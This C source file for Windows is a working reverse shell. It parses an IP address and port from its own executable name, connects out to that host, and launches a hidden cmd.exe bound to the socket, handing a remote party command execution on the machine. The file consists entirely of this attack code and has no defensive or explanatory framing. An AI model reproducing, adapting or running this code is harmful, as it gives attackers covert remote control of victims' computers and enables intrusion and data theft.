#include <winsock2.h>
#include <ws2tcpip.h> // for InetPton
#include <stdio.h>
#include <string.h> // for strtok
#include <stdlib.h> // for exit
#include <windows.h> // for GetModuleFileName and CreateProcess
#pragma comment(lib, "Ws2_32.lib")

WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

int main() {
    // Buffer for the executable path
    char exePath[MAX_PATH];
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        return 1; // Failed to get executable path
    }

    // Get the filename from the path
    char* exeName = strrchr(exePath, '\\'); // Find the last backslash
    if (exeName) {
        exeName++; // Move past the backslash
    }
    else {
        exeName = exePath; // If no backslash found, the whole path is the name
    }

    // Remove the ".exe" extension
    char* dotExe = strstr(exeName, ".exe");
    if (dotExe) {
        *dotExe = '\0'; // Null-terminate to remove the extension
    }
    else {
        return 1; // Invalid format
    }

    // Extract the IP and port from the executable name
    char* lastUnderscore = strrchr(exeName, '_'); // Find the last underscore
    if (!lastUnderscore) {
        return 1; // Invalid format
    }

    *lastUnderscore = '\0'; // Null terminate the first part
    char* secondUnderscore = strrchr(exeName, '_'); // Find the second underscore
    if (!secondUnderscore) {
        return 1; // Invalid format
    }

    char* ip = secondUnderscore + 1; 
    char* portStr = lastUnderscore + 1; 
    short port = (short)atoi(portStr); 


    WSAStartup(MAKEWORD(2, 2), &wsaData);


    wSock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    InetPton(AF_INET, ip, &hax.sin_addr);  


    if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        return 1; 
    }

    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES; 
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;


    CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sui, &pi);


    closesocket(wSock);
    WSACleanup();

    return 0;
}
